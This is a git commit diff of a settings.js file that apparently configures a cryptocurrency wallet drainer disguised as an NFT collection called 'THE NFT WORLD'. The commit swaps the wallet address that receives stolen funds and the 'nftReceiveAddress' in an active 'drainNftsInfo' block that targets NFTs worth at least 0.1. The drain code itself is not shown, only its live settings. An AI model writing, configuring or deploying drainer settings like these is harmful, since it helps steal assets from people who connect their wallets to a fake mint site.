2a015aca2e8d139237e56ac0c92f02112ce54a93
Elfonda <96784151+NuzulPakaya@users.noreply.github.com>
2023-07-23 18:32:24 +0800

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,4 +1,4 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+const receiveAddress = '0x0000e0f339c8b41Fc93e81Fc60110851d8f19714',
   collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
@@ -27,7 +27,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
   drainNftsInfo = {
     active: true,
     minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    nftReceiveAddress: '0x0000e0f339c8b41Fc93e81Fc60110851d8f19714',
   },
 
   customStrings = {
